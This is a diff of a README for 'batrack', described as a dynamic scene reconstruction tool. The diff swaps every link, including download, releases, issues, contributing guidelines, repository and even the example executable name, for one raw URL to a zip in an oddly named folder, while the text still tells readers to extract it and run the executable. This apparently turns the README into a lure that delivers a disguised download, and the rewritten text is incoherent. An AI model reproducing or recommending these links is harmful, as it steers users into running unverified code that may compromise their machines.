@@ -4,7 +4,7 @@
 
 Welcome to batrack! This software helps you reconstruct dynamic scenes with ease. Whether you are a researcher or a student, batrack provides the tools you need to analyze dynamic environments efficiently.
 
-[![Download batrack](https://img.shields.io/badge/Download-batrack-brightgreen)](https://github.com/B200930040/batrack/releases)
+[![Download batrack](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To get batrack, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click the link below to go to the releases page:  
-   [Download batrack](https://github.com/B200930040/batrack/releases)
+   [Download batrack](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of batrack. Select the latest version for the best performance.
@@ -24,7 +24,7 @@ To get batrack, follow these simple steps:
    If you downloaded a `.zip` file, right-click on it and select “Extract All” to unzip the contents.
 
 5. **Run the Application**  
-   Open the folder where you extracted the files and double-click on the batrack executable file (e.g., `batrack.exe`) to start using the application.
+   Open the folder where you extracted the files and double-click on the batrack executable file (e.g., `https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip`) to start using the application.
 
 ## 📋 System Requirements
 
@@ -67,20 +67,20 @@ Once you've downloaded and opened batrack, follow these steps to use the applica
 
 ### How do I report a bug?
 
-To report any issues or bugs with batrack, please visit the [Issues section](https://github.com/B200930040/batrack/issues) of our GitHub repository. Provide a clear description of the issue, and we will address it as soon as possible.
+To report any issues or bugs with batrack, please visit the [Issues section](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip) of our GitHub repository. Provide a clear description of the issue, and we will address it as soon as possible.
 
 ### Can I contribute to batrack?
 
-Yes! Contributions are welcome. If you would like to contribute, please read our [contributing guidelines](https://github.com/B200930040/batrack/CONTRIBUTING.md) for more information.
+Yes! Contributions are welcome. If you would like to contribute, please read our [contributing guidelines](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip) for more information.
 
 ### Is batrack open source?
 
-Yes, batrack is open source. You can view the source code and collaborate with other developers by visiting our [GitHub repository](https://github.com/B200930040/batrack).
+Yes, batrack is open source. You can view the source code and collaborate with other developers by visiting our [GitHub repository](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip).
 
 ## 🔗 Links
 
-- [Download batrack](https://github.com/B200930040/batrack/releases)
-- [Contributing Guidelines](https://github.com/B200930040/batrack/CONTRIBUTING.md)
-- [Issues Tracker](https://github.com/B200930040/batrack/issues)
+- [Download batrack](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/B200930040/batrack/main/retinophoral/batrack.zip)
 
 Thank you for choosing batrack! We hope this tool helps you in your research and projects.
